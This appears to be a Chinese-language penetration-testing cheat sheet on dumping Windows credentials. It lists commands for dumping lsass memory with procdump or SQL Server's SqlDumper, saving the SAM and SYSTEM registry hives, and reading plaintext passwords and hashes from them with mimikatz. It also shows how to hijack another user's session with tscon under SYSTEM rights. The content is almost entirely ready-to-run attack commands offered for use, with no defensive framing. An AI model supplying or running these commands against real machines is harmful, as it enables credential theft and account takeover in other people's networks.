# dump passwd

---

远程内存dump，本地使用mimikatz读取dump文件中域用户登陆次电脑中保存的密码

- procdump下载：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
- mimikatz下载：https://github.com/gentilkiwi/mimikatz/releases

```
procdump64.exe -accepteula -ma lsass.exe 1.dmp   # dump内存
makecab .\1.dmp  1.zip                           # windows自带压缩
下载1.zip，本地解压使用：
mimikatz.exe "log" "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit
```

sqlserver dump(来源:https://xz.aliyun.com/t/9831)

```
dir /s/a-d/b C:\*sqldumper.exe   # 查看是否有sqlserver,切换到该目录
for /f  "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do Sqldumper.exe %i 0 0x01100   # 查看是否有sql保存凭证
mimikatz.exe  "sekurlsa::minidump SQL.dmp" "sekurlsa::logonPasswords full" exit
```

sqlserver dump 知道sqlserver路径

```
查看lsass.exe的pid（lsass为windows本地安全和登陆策略的系统进程）
tasklist /svc |findstr lsass.exe

584是lsass.exe的pid
"C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe" 584 0 0x01100

下载：SQLDmpr0001.mdmp

本地通过mimikatz对mdmp文件读取明文密码
mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" "exit">1.txt
```

sam数据库(来源:https://xz.aliyun.com/t/9831)

```
reg save hklm\sam .\sam.hive&reg save hklm\system .\system.hive
mimikatz.exe "lsadump::sam /system:sys.hive /sam:sam.hive"
```

powershell 版mimikatz

```
https://github.com/Stealthbits/poshkatz
```

注意：

```
通过此命令看是否有会话运行中，没有再远程登陆
query user   # 同时可以查看用户id，比如administrator为2
cmd /k tscon 2 /dest:console  # system权限下可以任意切换其他用户的cmd
```

